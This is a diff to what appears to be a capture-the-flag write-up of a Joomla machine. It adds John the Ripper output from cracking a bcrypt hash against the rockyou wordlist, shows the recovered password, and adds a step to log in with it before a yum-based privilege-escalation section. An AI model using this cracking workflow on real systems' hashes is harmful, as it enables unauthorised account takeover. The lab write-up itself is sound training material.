@@ -135,8 +135,21 @@ This python script is specific for Joomla:
 Put hash in a file named `hash.txt` and crack the hash:
 
     # john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+    Using default input encoding: UTF-8
+    Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+    Cost 1 (iteration count) is 1024 for all loaded hashes
+    Will run 4 OpenMP threads
+    Press 'q' or Ctrl-C to abort, almost any other key for status
+    0g 0:00:00:19 0.01% (ETA: 2022-10-04 09:12) 0g/s 83.11p/s 83.11c/s 83.11C/s rock you..gymnastics
+    0g 0:00:00:21 0.01% (ETA: 2022-10-04 11:22) 0g/s 81.01p/s 81.01c/s 81.01C/s 2hot4u..sexylove
+    spiderman123     (?)     
+    1g 0:00:10:44 DONE (2022-10-02 00:27) 0.001551g/s 72.65p/s 72.65c/s 72.65C/s thelma1..speciala
+    Use the "--show" option to display all of the cracked passwords reliably
+    Session completed.
 
 ### Privilege escalation
+
+Log in with the found username and password.
 
 Yum is a free and open-source command-line package-management utility for Linux-based operating system which uses the RPM Package Manager.
 
